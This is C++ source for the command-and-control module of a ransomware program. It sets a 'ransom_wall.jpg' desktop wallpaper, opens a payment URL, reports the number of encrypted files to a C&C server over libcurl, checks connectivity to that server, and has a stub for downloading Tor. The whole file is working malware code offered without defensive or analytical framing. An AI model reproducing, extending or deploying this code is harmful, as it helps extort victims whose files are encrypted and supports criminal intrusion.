#define CURL_STATICLIB
#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <stdlib.h>
#include<cstring>
#include "curl/curl.h"
#include "after_day.h"

#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(_CYGWIN_)
#define WIN32_WINNT 0x0500
    #include<Windows.h>
    #include<WinInet.h>
    #include <shlobj.h>
    #include <AtlBase.h>
    #include <AtlConv.h>
    #include<shobjidl_core.h>
    #include<shlobj_core.h>
    #include<comdef.h>

    #pragma warning(disable: 4996)  //Disable Function or Variable may be unsafe warning

    #pragma comment (lib, "Normaliz.lib")
    #pragma comment (lib, "Ws2_32.lib")
    #pragma comment (lib, "Wldap32.lib")
    #pragma comment (lib, "CRYPT32.LIB")
#endif

using namespace std;

int CandC::openReward(void){
    std::string url_host = HOST;
    std::string complet_url = url_host;
    char *complet = (char*) complet_url.c_str();
    #if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(_CYGWIN_)
	    ShellExecuteA(NULL, "open", complet, NULL, NULL, SW_SHOWNORMAL);
        HRESULT hr = CoInitialize(nullptr);
        IDesktopWallpaper* pDesktopWallpaper = nullptr;
        hr = CoCreateInstance(__uuidof(DesktopWallpaper), nullptr, CLSCTX_ALL, IID_PPV_ARGS(&pDesktopWallpaper));

        int AutoStartOption = 0;

        if (FAILED(hr))
        {
            MessageBox(NULL, L"desktop failed", L"error", 0);
        }
        else
        {
            
            pDesktopWallpaper->SetWallpaper(nullptr, L"ransom_wall.jpg");

            pDesktopWallpaper->Release();

            if (FAILED(hr)) {
                MessageBox(NULL, L"desktop error", L"error", 0);
            }
        }

    #else
	    std::string browser_cmd = "x-www-browser "+complet_url;
	    char *browser_cmd_chared = (char*) browser_cmd.c_str();
	    system(browser_cmd_chared);
    #endif

    return 0;
}

int CandC::hello(void)
{
    //cout << "hello" << endl;
    return 0;
}

#if defined(WIN32)
int CandC::download_tor(void)
{
    return 0;
}
#endif

static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    ((std::string*)userp)->append((char*)contents, size * nmemb);
        return size * nmemb;
}

int CandC::insert_target(void){
    string nb_file = this->nb_file;
    //cout << "Encrypted file : " << nb_file << endl;
    string url_host = HOST;
    string url_path = PATH;
    string complet_url = url_host + url_path + "?insert=1&nb_file=" + nb_file;
    //cout << "complet url: " << complet_url << endl;
    char *url;
    url = (char*) complet_url.c_str();
    //cout << "complet url2: " << url << endl;
    CURL *curl;
    CURLcode res;
    curl = curl_easy_init();
    if(curl)
    {
	    curl_easy_setopt(curl, CURLOPT_URL, url);
	    res = curl_easy_perform(curl);
	    curl_easy_cleanup(curl);
	    if(res == CURLE_OK)
	    {
	        //cout << "Send to C&C" << endl;
        }
        else {
            MessageBox(NULL, L"Curl Failed", L"err", 0);
        }
    }
    return 0;
}

int CandC::checkifconnected(void){
    if(__TOR_USED__ == 0){
	CURL *curl;
	CURLcode res;
    char url[1024];
    strcpy(url, HOST);
	string content;
	curl = curl_easy_init();
	if(curl){
	    //cout << "Curl ok" << endl;
	    curl_easy_setopt(curl, CURLOPT_URL, url);
	    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
	    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &content);
	    res = curl_easy_perform(curl); 
	    curl_easy_cleanup(curl);
	    if(res == 0){
		return 0;
	    }
	}
    }
    return 1;
}
